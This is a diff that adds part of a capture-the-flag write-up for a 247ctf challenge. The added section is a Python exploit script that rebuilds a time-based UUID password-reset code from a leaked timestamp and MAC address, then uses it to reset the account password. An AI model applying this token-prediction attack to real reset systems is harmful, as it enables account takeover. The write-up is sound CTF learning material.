@@ -151,5 +151,44 @@ All we need to do now is a get reqeust to `/get_flag` with the password we set f
 
 <img src="images/image24.png" width="600">
 
+I wrote a simple python script to automate this process. All you need to do is hardcode the clock sequence hex value e.g in the above example i would hardcode the value -> `92C6`
+
+Plus notice on line 18 in my exploit `int(date[11:13]) +3` I add 3 to the hour value to make the timestamp UTC since my local time is GMT.
+
+exploit.py
+```
+import requests
+import datetime
+
+url = "https://6ff30d4e8523c0e0.247ctf.com/"
+
+statistics = requests.get(url=url+"statistics")
+
+time = statistics.content.split("last_reset: ", 1)[1][:29]
+HWaddr = statistics.content.split("HWaddr ", 1)[1][:17]
+HWaddr = HWaddr.replace(':', '').lower()
+
+date = time[:19]
+decimal = time[20:]
+value = 12219292800
+
+clock_sequence = "92c6"
+
+timestamp = datetime.datetime(int(date[:4]), int(date[5:7]), int(date[8:10]), int(date[11:13]) +3, int(date[14:16]), int(date[17:19])).strftime('%s')
+
+plus = int(timestamp) + value
+
+nano = str(plus) + str(decimal)
+nano = nano[:-2]
+
+hex1 = hex(int(nano))
+hex1 = hex1[2:]
+
+uuid = hex1[7:] + "-" + hex1[3:7] +"-"+ "1" + hex1[:3] + "-" + clock_sequence + "-" + HWaddr
+print "Trying: " + uuid
+update = requests.get(url=url+"update_password?reset_code=" +uuid+ "&password=saintbarber")
+print update.content
+```
+
 ---
 #### sAINT_barber
